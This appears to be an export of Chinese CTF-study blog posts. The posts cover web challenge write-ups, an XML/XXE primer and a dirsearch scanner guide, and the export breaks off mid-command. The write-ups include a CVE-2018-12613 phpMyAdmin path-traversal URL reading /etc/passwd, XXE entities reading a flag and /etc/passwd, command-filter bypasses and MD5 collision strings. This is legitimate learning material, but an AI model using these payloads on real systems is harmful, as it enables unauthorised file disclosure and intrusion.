[{"title":"Web刷题(二)","url":"/2022/11/22/Web%E5%88%B7%E9%A2%98-%E4%BA%8C/","content":"GWCTF 2019]我有一个数据库自己的想法打开网站，发现只有乱码文字，没有其他的\n\n尝试用burpsuite看一下，也没有什么\n\n然后用工具扫描一下，发现有robots.txt文件，打开查看，有个php文件，访问它，也没有发现啥，继续扫描，发现phpadmin目录！！！\n\n\n访问phpadmin后\n\nemm。。小白不会了\n看的wp发现有个漏洞CVE-2018-12613&amp;PHPmyadmin 4.8.0/4.8.1漏洞\n简单就是说，可以构造url参数，利用include函数实现任意文件读取或者写入（一句话木马等）\n然后构造payload（../../../../../../../是直接跳到根目录里了）\n读取  etc/passwd：http://IP/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd\n读取flag ： http://IP/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd\n[BJDCTF2020]Mark loves cat自己的做题想法打开网站，看源代码，都点完了，没发现什么异常，此时大概率就是要扫描网站一下，\n\ndirsearch扫描发现很多&#x2F;.git&#x2F;目录的，可以知道是git源码泄露，\n使用githack工具，\n\n打开index.php文件，发现有几个if函数，还有变量赋值！！\n可以看到，当if条件都不满足时，才能输出$flag的值\n但是三个if语句里有输出变量值，加上前面还有变量赋值，应该可以用来做点东西\n但是$$符号我给看晕了。。。😵\n&amp;&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;echo &quot;$&#123;is&#125;&quot;;foreach($_POST as $x =&gt; $y)&#123;    $$x = $y;\t\t\t## post提交的数据&#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;\t\t\t## get提交的数据&#125;foreach($_GET as $x =&gt; $y)&#123;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;\t\t### 满足get数据有flag键项，且该键项对应的值等于get数据的其他        exit($handsome);\t\t\t\t\t\t\t### 键项，其他键项还不为‘flag’\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t### 即&#123;&#x27;flag&#x27;:&#x27;b&#x27;,&#x27;b&#x27;:&#x27;123&#x27;&#125;的形式    &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;\t### get和post提交数据都不能有flag的键项\t    exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;   ### post或get至少有一个含&#123;&#x27;flag&#x27;:&#x27;flag&#x27;&#125;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;?&gt;\n\n看wp后发现好像很简单的。。。\n\n第一个if的绕过，要使得$handsome = $flag ，只需要get的foreach中赋值即可，故构造get: ?handsome=flag&amp;flag=b&amp;b=flag 注意参数的顺序,如下图，会有影响！！！！\n\n\n\n# 此时的变量覆盖流程为$flag = $b  ## 此时$b是空变量！！！，还把flag变量给置空了$b = $flag$handsome = $flag ##尽管成功替换，但flag被修改了\n\n\n\n\n\n\n\n# 此时的变量覆盖流程$b = $flag$flag = $b ##$flag的值没有被修改$handsome = $flag  ##$handsome被成功替换为$flag\n\n\n第二个if 的绕过，还是类似的，只需要$is=$flag即可，此时的话，只需要get: ?yds=flag就行了\n\n\n\n\n第三个if的绕过，也是一样的思路，要满足$is = $flag，和if条件，get: ?is=flag &amp;flag=flag\n不能用post提交数据，因为post是先覆盖变量，会把flag原值给替换了\n\n\n\n\n\n\n[NCTF2019]Fake XML cookbook自己做打开网站，看源码，没有啥东西，一个登录框\n\n尝试sql注入，万能密码试一下。\nadmin&#39; or 1# 也不行\n然后又不会了\n看wp是基于xml得XEE漏洞，\n然后不懂xml，于是学了半天，，\n懂了xml后，发现是传参数时，是传的xml数据，可以通过修改xml数据，读取服务器中的文件（原理是实体变量进行外部引用时，读取外部文件）\n于是又构造payload\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE uesr[&lt;!ENTITY admin SYSTEM &quot;../../../../../../../flag&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123321&lt;/password&gt;&lt;/user&gt;  \n\n\n安洵杯 2019]easy_web自己的想法打开网站，没有啥\n\n看源码，发现点东西，可能用data://image/gif;baes64,来读取文件？还有个md5相关的\n\n\nburp抓包查看，发现还有一个cmd的参数，可能有命令执行？\n\n然后index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=的参数中imag这似乎有个base64编码，尝试解码看，\n发现使用了两次base64解码，然后最后的是一个16进制的，再进制转字符串，解出来为 555.png\n发现是传一个文件名，然后打开它再显示，于是想直接传flag的路径试试，../../../../../../../flag尝试，结果失败，返回信息提示是不能含有flag字样\n然后cmd命令执行，又想尝试ls或pwd等命令，结果显示也不行，估计过滤比较严格\n好了，又不会了。。。\n看的wp发现虽然不能直接看flag，但是可以查看indx.php的源码，\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;]))     header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;    die(&quot;xixiï½ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;\t//传数组不行，得MD5碰撞    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;\n\n可以看到，cmd命令那儿得过滤很严，大部分命令都不行，\n然后还得满足if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))\n必须得用md5碰撞，再一个，cmd命令这，打开文件的话cat、more、less、tail、head、tac、都不能用，但还有一个命令**strings可以直接读文件中得字符串，还有cat/t**这种绕过也可以！！！\n最后成功get！！\n\n小贴士php中的md5匹配绕过\n双等于（弱等于）\nif($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]&amp;&amp; md5($_POST[&#x27;a&#x27;]) == md5($_POST[&#x27;b&#x27;])) &#123;\techo $flag;&#125;\n\n原理：\n在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 0e 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。\n常用 MD5 值以 0e 开头的字符串：\n\n\n\n字符串\nMD5 值\n\n\n\nQNKCDZO\n0e830400451993494058024219903391\n\n\ns878926199a\n0e545993274517709034328855841020\n\n\ns155964671a\n0e342768416822451524974117254469\n\n\ns214587387a\n0e848240448830537924465865611904\n\n\n​\t\n​\t\n三等于（强等于）\nif($_GET[&#x27;a&#x27;] !== $_GET[&#x27;b&#x27;])&#123;    if(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;]))&#123;    \techo &quot;flag&quot;;    &#125;&#125;\n\n原理：\n在 php 中，&#x3D;&#x3D;&#x3D; 代表着强比较，不仅仅会比较值，还会比较类型。因此这里不能在使用上面的方式进行绕过了。\n要绕过此处的比较，需要向 md5() 函数中传入数组，md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null&#x3D;null为 True 绕过。同样可用于弱等于绕过\nMD5碰撞\nif ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;\techo $flag;&#125;\n\n注意，此时使用string强制转换为字符串型，所以使用数组的方法失效，因为string转换后在匹配的话，结果是true相等的\n此时只能用两个不同的字符串，但md5后相同的来绕过\n$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;\n\n\n\n其他的\n$a==md5($a)\n这一类题型要求满足$a是0e开头，且加密后也是0e开头\n可以使用一下几个：\n\n\n\n0e215962017 0e291242476940776845150308577824\n\n\n\n0e1284838308 0e708279691820928818722257405159\n\n\n","categories":["Web","xml"],"tags":["PHPmyadmin","哈希碰撞","命令执行绕过","xee漏洞"]},{"title":"XML及其漏洞","url":"/2022/11/23/XML%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/","content":"XML学习简介 XML 被设计用来传输和存储数据，其焦点是数据的内容。        HTML 被设计用来显示数据，其焦点是数据的外观。        HTML 旨在显示信息，而 XML 旨在传输信息。\nXML基本格式与基本语法&lt;? version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;&lt;!-- 这是条注释，告诉你它是注释的写法 --&gt;&lt;root&gt;    &lt;title&gt;hello world&lt;/title&gt;    &lt;body&gt;beautiful!!&lt;/body&gt;&lt;/root&gt;\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用不能应用外部dtd实体变量, 后有介绍，但它的默认值是no，而且有些parser会直接忽略这一项。\n基本语法：\n\n所有 XML 元素都须有关闭标签。\nXML 标签对大小写敏感。\nXML 必须正确地嵌套。\nXML 文档必须有根元素。\nXML 的属性值须加引号。\n\n实体引用和html或其他编程语言一样，因为&lt;和&gt;代表着标签的开始与结束，所以使用当标签内的字符中含有&lt;和&gt;时，会发生混淆，所以使用实体引用的方式来解决。其实就相当于一个编码或者宏定义，而如果标签内的内容含有大量的&lt;或&gt;等其它特殊字符时，可以使用&lt;! [CDATD [  ...你的内容... ] ]&gt;，里面的内容不会进行实体解析，所以不会受影响\n内部已定义的实体引用有以下5个: \n\n\n\n&lt;\n&lt;\nless than\n\n\n\n&gt;\n&gt;\ngreater than\n\n\n&amp;\n&amp;\nampersand\n\n\n&amp;apos;\n‘\napostrophe\n\n\n&quot;\n“\nquotation mark\n\n\n自定义的实体引用实体是用于定义引用普通文本或特殊字符的快捷方式的变量。        实体引用是对实体的引用。        实体可在内部或外部进行声明。\n按实体使用方式分类，实体分为内部声明实体和引用外部实体\n\n内部实体\n\n&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;\n内部实体示例代码：\n&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;&amp;copyright;&lt;/test&gt;\n\n\n外部实体\n\n​\t\t外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。\n&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;\n\n外部实体示例代码：\n&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;&amp;copyright;&lt;/author&gt;\n\nPCDATA和CDATAPCDATAPCDATA的意思是被解析的字符数据。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp; &lt; &gt;实体来分别替换。CDATA\nCDATA的意思是不被解析的字符串，即使用&lt;、&gt;和&#39;等特殊字符不需要使用实体引用，直接使用即可\nDTDDTD基本概念就是用来自定义规范xml文档的格式和内容，保证标签名，属性等等都严格按照dtd中规范的来填写\nDTD的使用\n内部 DTD\n使用内部的dtd文件，即将约束规则定义在xml文档中\n\n\n&lt;!DOCTYPE 根元素名称 [在这方括号里进行元素声明,声明每个元素的特征要求等，以下示例中有note,to,from,head,body共五个标签，分别进行要求note -- 是根节点，标签内没有属于它的字符串值，只有四个标签元素to   -- 内有字符串值，故定义为 PCDATA 的类型，意思是可解性性字符串，具体可见下表from -- 与to一样head -- 与to一样body -- 与to一样]&gt;例如（我自己的示例）：&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;]&gt;\n\n示例代码（官方的）：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;\n\n\n外部 DTD（1）引入外部的dtd文件（本地主机）\n\n&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;\n​\t\t（2）使用外部的dtd文件(网络上的dtd文件)\n&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;\n例如，当使用外部（本地主机）DTD时，通过如下语法引入：\n&lt;!DOCTYPE 根元素 SYSTEM &quot;filename&quot;&gt;\n示例代码：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;\n\ntest.dtd  —— 再这里只需要定义子标签中的元素即可！！！\n&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;\n\nDTD属性如果标签中含有属性时，那么还需要规定属性的特征要求等，例如\n&lt;? version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;root id=&quot;1&quot;&gt;        &lt;!-- 此时定义dtd时，就需要对id属性进行要求 --&gt;&lt;sub&gt;菁菁菁&lt;/sub&gt;&lt;pat&gt;啦啦啦&lt;/pat&gt;&lt;/root&gt;\n\n于是增加定义成如下内容\n&lt;? version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE root[        &lt;!ELEMENT root (sub,pat) &gt;        &lt;!ATTLIST root id CDATA &quot;1&quot;&gt;\t\t&lt;!-- 格式为：ATTLIST 元素名称 属性名称 属性类型 默认值 --&gt;        &lt;!ELEMENT sub (#PCDATA) &gt;        &lt;!ELEMENT pat (#PCDATA) &gt;]&gt;&lt;root id=&quot;1&quot;&gt;        &lt;sub&gt;菁菁菁&lt;/sub&gt;&lt;pat&gt;啦啦啦&lt;/pat&gt;&lt;/root&gt;\n\n属性声明语法：\n&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;\nDTD实例：\n&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;\nXML实例：\n&lt;payment Luckey=&quot;Q&quot; /&gt;\n以下是 属性类型的选项：\n\n\n\n类型\n描述\n\n\n\nCDATA\n值为字符数据 (character data)\n\n\n(en1|en2|..)\n此值是枚举列表中的一个值\n\n\nID\n值为唯一的 id\n\n\nIDREF\n值为另外一个元素的 id\n\n\nIDREFS\n值为其他 id 的列表\n\n\nNMTOKEN\n值为合法的 XML 名称\n\n\nNMTOKENS\n值为合法的 XML 名称的列表\n\n\nENTITY\n值是一个实体\n\n\nENTITIES\n值是一个实体列表\n\n\nNOTATION\n此值是符号的名称\n\n\nxml:\n值是一个预定义的 XML 值\n\n\n默认属性值可使用下列值 :\n\n\n\n值\n解释\n\n\n\n值\n属性的默认值\n\n\n#REQUIRED\n属性值是必需的\n\n\n#IMPLIED\n属性不是必需的\n\n\n#FIXED value\n属性值是固定的\n\n\n总结下两种外部导入dtd外部导入\n&lt;!DOCTYPE 根源素名称 system/public  dtd文件的路径（url）&gt;\n\n实体引用的导入\n&lt;!DOCTYPE 根元素名称[    &lt;!ENTITY 实体名称 system/public 文件路径 &gt;]&gt;    \n\n参考从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)\n","categories":["Web","知识学习"],"tags":["Xml","xml注入"]},{"title":"dirsearch工具使用","url":"/2022/11/22/dirsearch%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","content":"dirsearch介绍dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。相比其他扫描工具disearch的特点是：\n支持HTTP代理\n多线程\n支持多种形式的网页（asp,php）\n生成报告（纯文本，JSON）\n启发式检测无效的网页\n递归扫描\n用户代理随机化\n批量处理\n扫描器与字典（注：字典必须是文本文件）\n下载及安装要求:python 3.7或更高版本 \n其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 \n使用Git安装\ngit clone https://github.com/maurosoria/dirsearch.git        使用ZIP文件安装\nhttps://github.com/maurosoria/dirsearch/archive/master.zip        使用Docker安装   \n详细信息：GitHub - maurosoria&#x2F;dirsearch: Web path scanner\nDocker build-t“dirsearch:v0.4.1 使用Kali Linux安装       \nsudo apt-get Install dirsearch使用PYPI安装\nPIP3 Install DirSearch注意:*若要使用SOCKS代理功能，请安装带有Requirements.txt的包:\npip3 install -r requirements.txt一起安装：\ngit clone https://github.com/maurosoria/dirsearch.gitcd dirsearchpip3 install -r requirements.txt\n\n\n如何使用演示视频：https://asciinema.org/a/380112.svg\n地址:https://asciinema.org/a/380112\n简单用法\npython3 dirsearch.py -u https://targetpython3 dirsearch.py -e php,html,js -u https://targetpython3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist\n\n\n递归扫描-通过使用**-r–recursive**参数，dirsearch将强制递归所有目录。\npython3 dirsearch.py -e php,html,js -u https://target -r可以用**–recursion-depth设置最大递归深度，用–recursion-status**设置递归状态代码\npython3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399还有2个选项:–force-recursive和**–deep-recursive**\nforce-recursive(强制递归):强力递归所有找到的路径，而不仅仅是以/结尾的路径        deep-recursive(深度递归):递归强力路径的所有深度(a/b/c&#x3D;&gt;adda/,a/b/)\n线程线程数(-t | –threads)反映了分离的强力进程的数量。因此，线程数越大，dirsearch运行得越快。默认情况下，线程数为30，但如果想加快进度，可以增加。\n尽管如此，速度仍然在很大程度上取决于服务器的响应时间。作为警告，建议保持线程数不要太大，因为这可能导致DOS。\npython3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20\n前缀&#x2F;后缀–prefixes:为所有条目添加自定义前缀\npython3 dirsearch.py -e php -u https://target --prefixes .,admin,_基础路径：\n  tools\n加上前缀后：\n.tools\nadmintools         _tools\n–suffixes:为所有条目添加自定义后缀\npython3 dirsearch.py -e php -u https://target --suffixes ~基础路径：\nindex.php        internal\t\n加上后缀后：\nindex.php~         internal~&#96;\n黑名单在’db&#x2F;‘文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中筛选这些文件中的路径。\n示例：如果将admin.php添加到db/403_blacklist.txt中，那么每当进行扫描时，admin.php返回403，就会从结果中筛选出来。\n筛选器使用**-i-include-status和-x-exclude-status**选择允许和不允许响应状态代码\n更高级的过滤器:–exclude-sizes、**–exclude-texts、–exclude-regexps、–exclude-redirects和–exclude-content**\npython3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KBpython3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html\n\n原始请求dirsearch允许您从文件中导入原始请求。内容如下所示:\nGET /admin HTTP/1.1Host: admin.example.comCache-Control: max-age=0Accept: */*\n\n因为dirsearch无法知道URI方案是什么，所以需要使用’–scheme’标志来设置它。默认情况下，该方案是’HTTP’，这会导致大量的假阴性。\nWordlist格式支持的wordlist格式：uppercase, lowercase, capitalization\nLowercase：（小写）\nadmin        index.html\nUppercase:（大写）\n ADMIN        INDEX.HTML\nCapital：（首字母大写）\n Admin       Index.html\n排除扩展使用**-x–exclude-extensions**扩展列表将删除wordlist中包含给定扩展的所有路径\npython3 dirsearch.py -u https://target -X jsp基础路径：\nadmin.php        \ntest.jsp&#96;\n排除扩展后：\nadmin.php\n-如果要排除所有扩展名，除了在’-e’标志中选择的扩展名之外，请使用**–only-selected**\npython3 dirsearch.py -e html -u https://target --only-selected基础路径：\nindex.html         admin.php\t\n排除扩展后：\nindex.html    \n扫描子目录-从URL中，你可以用**–subdirs**扫描子目录列表。\npython3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/-反向版本是**–exclude-subdirs**，它阻止dirsearch递归扫描给定的子目录。\npython3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/\n代理dirsearch支持SOCKS和HTTP代理，有两个选项：代理服务器或代理服务器列表。\npython3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080python3 dirsearch.py 